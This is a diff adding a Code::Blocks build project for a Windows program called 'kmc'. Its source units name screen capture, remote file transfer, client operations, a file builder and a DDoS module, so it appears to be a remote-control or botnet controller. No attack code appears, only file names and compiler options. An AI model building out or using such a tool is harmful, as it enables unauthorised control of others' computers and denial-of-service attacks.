@@ -1,0 +1,143 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+<CodeBlocks_project_file>
+	<FileVersion major="1" minor="6" />
+	<Project>
+		<Option title="kmc" />
+		<Option pch_mode="2" />
+		<Option compiler="gcc" />
+		<Build>
+			<Target title="Debug">
+				<Option output="..\Release\kmc" prefix_auto="1" extension_auto="1" />
+				<Option object_output="obj\Debug\" />
+				<Option type="1" />
+				<Option compiler="gcc" />
+				<Option use_console_runner="0" />
+				<Compiler>
+					<Add option="-g" />
+				</Compiler>
+				<Linker>
+					<Add option="-lws2_32" />
+					<Add option="-lcomctl32" />
+					<Add option="-lgdi32" />
+					<Add option="-lcomdlg32" />
+				</Linker>
+			</Target>
+			<Target title="Release">
+				<Option output="..\Release\kmc" prefix_auto="1" extension_auto="1" />
+				<Option object_output="obj\Release\" />
+				<Option type="0" />
+				<Option compiler="gcc" />
+				<Compiler>
+					<Add option="-O2" />
+				</Compiler>
+				<Linker>
+					<Add option="-s" />
+					<Add option="-lws2_32" />
+					<Add option="-lcomctl32" />
+					<Add option="-lgdi32" />
+					<Add option="-lcomdlg32" />
+				</Linker>
+			</Target>
+		</Build>
+		<Compiler>
+			<Add option="-Wall" />
+		</Compiler>
+		<Unit filename="crc32.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="crc32.h" />
+		<Unit filename="file.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="file.h" />
+		<Unit filename="frame_tools.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="frame_tools.h" />
+		<Unit filename="ip_info.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="ip_info.h" />
+		<Unit filename="km_head.h" />
+		<Unit filename="km_socket.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="km_socket.h" />
+		<Unit filename="lzw.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="lzw.h" />
+		<Unit filename="m_frame_cap_screen.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="m_frame_cap_screen.h" />
+		<Unit filename="m_frame_cap_screen_event.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="m_frame_cap_screen_event.h" />
+		<Unit filename="m_frame_file.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="m_frame_file.h" />
+		<Unit filename="m_frame_file_event.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="m_frame_file_event.h" />
+		<Unit filename="m_frame_file_updown.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="m_frame_file_updown.h" />
+		<Unit filename="m_frame_screen.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="m_frame_screen.h" />
+		<Unit filename="m_frame_screen_event.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="m_frame_screen_event.h" />
+		<Unit filename="m_make_center.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="m_make_center.h" />
+		<Unit filename="m_make_file.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="m_make_file.h" />
+		<Unit filename="main.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="main_frame.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="main_frame.h" />
+		<Unit filename="main_frame_client_op.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="main_frame_client_op.h" />
+		<Unit filename="main_frame_ddos.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="main_frame_ddos.h" />
+		<Unit filename="main_frame_event.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="main_frame_event.h" />
+		<Unit filename="main_frame_log.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="main_frame_log.h" />
+		<Unit filename="module_manger.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="module_manger.h" />
+		<Unit filename="resource.h" />
+		<Unit filename="tcs.rc">
+			<Option compilerVar="WINDRES" />
+		</Unit>
+		<Extensions>
+			<code_completion />
+			<envvars />
+			<debugger />
+		</Extensions>
+	</Project>
+</CodeBlocks_project_file>
